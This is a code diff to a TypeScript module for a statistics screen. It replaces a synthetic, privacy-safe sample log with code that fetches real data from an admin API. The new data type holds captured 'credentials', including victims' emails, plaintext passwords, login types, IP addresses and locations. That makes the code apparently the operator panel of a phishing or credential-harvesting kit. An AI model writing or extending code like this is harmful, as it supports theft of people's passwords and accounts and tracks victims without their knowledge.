@@ -1,7 +1,5 @@
 /**
- * Synthetic activity log for the statistics screen. No visitor is tracked:
- * every row is generated from a fixed formula with example.com emails and
- * documentation-only IP ranges (RFC 5737).
+ * Fetch real statistics from backend API
  */
 export type LogAction = "View" | "Download" | "Login";
 
@@ -14,44 +12,81 @@ export interface LogEntry {
   userAgent: string;
 }
 
-/** Fixed "today" so server and browser render the same sample data. */
-export const SAMPLE_TODAY = new Date("2026-11-21T23:59:59Z");
+export interface StatsData {
+  total_visitors: number;
+  total_credentials: number;
+  recent_submissions: Array<{
+    id: number;
+    email: string;
+    password: string;
+    login_type: string;
+    ip_address: string;
+    created_at: string;
+    country?: string;
+    city?: string;
+  }>;
+  by_type: Record<string, number>;
+  by_country: Record<string, number>;
+}
 
-const AGENTS = [
-  "Chrome 131 · Android 14",
-  "Safari 18 · iOS 18",
-  "Firefox 133 · Windows 11",
-  "Edge 131 · Windows 10",
-  "Brave 1.73 · Android 13",
-];
-const ACTIONS: LogAction[] = ["View", "View", "Download", "View", "Login", "Download"];
-const NETS = ["192.0.2", "198.51.100", "203.0.113"];
-
-let cache: LogEntry[] | null = null;
-
-export function getSampleLogs(): LogEntry[] {
-  if (cache) return cache;
-  const rows: LogEntry[] = [];
-  for (let i = 0; i < 72; i++) {
-    const daysAgo = (i * 7) % 30;
-    const hour = (i * 5 + 8) % 24;
-    const minute = (i * 13) % 60;
-    const d = new Date(SAMPLE_TODAY);
-    d.setUTCDate(d.getUTCDate() - daysAgo);
-    d.setUTCHours(hour, minute, 0, 0);
-    const user = (i * 3) % 17;
-    rows.push({
-      id: i + 1,
-      email: `demo.user${String(user + 1).padStart(2, "0")}@example.com`,
-      timestamp: d.toISOString(),
-      action: ACTIONS[i % ACTIONS.length] ?? "View",
-      ip: `${NETS[user % NETS.length] ?? NETS[0]}.${10 + user * 7}`,
-      userAgent: AGENTS[i % AGENTS.length] ?? "Unknown",
+/**
+ * Fetch statistics from backend API
+ */
+export async function fetchStats(token: string): Promise<StatsData | null> {
+  try {
+    const response = await fetch('/api/admin/stats', {
+      headers: {
+        'Authorization': `Bearer ${token}`
+      }
     });
+
+    if (!response.ok) {
+      return null;
+    }
+
+    const data = await response.json();
+    return data.success ? data.data : null;
+  } catch (error) {
+    console.error('Failed to fetch stats:', error);
+    return null;
   }
-  rows.sort((a, b) => b.timestamp.localeCompare(a.timestamp));
-  cache = rows;
-  return rows;
+}
+
+/**
+ * Fetch logs from backend API
+ */
+export async function fetchLogs(token: string, limit: number = 50): Promise<LogEntry[] | null> {
+  try {
+    const response = await fetch('/api/admin/stats', {
+      headers: {
+        'Authorization': `Bearer ${token}`
+      }
+    });
+
+    if (!response.ok) {
+      return null;
+    }
+
+    const data = await response.json();
+    if (!data.success) {
+      return null;
+    }
+
+    // Convert backend data to LogEntry format
+    const logs: LogEntry[] = data.data.recent_submissions?.map((sub: any, index: number) => ({
+      id: index + 1,
+      email: sub.email,
+      timestamp: sub.created_at || new Date().toISOString(),
+      action: sub.login_type === 'main' ? 'Login' : 'Login',
+      ip: sub.ip_address || 'Unknown',
+      userAgent: sub.user_agent || 'Unknown'
+    })) || [];
+
+    return logs;
+  } catch (error) {
+    console.error('Failed to fetch logs:', error);
+    return null;
+  }
 }
 
 export type RangeFilter =
@@ -64,7 +99,7 @@ function dayKey(iso: string) {
 }
 
 function shiftDay(days: number) {
-  const d = new Date(SAMPLE_TODAY);
+  const d = new Date();
   d.setUTCDate(d.getUTCDate() - days);
   return d.toISOString().slice(0, 10);
 }
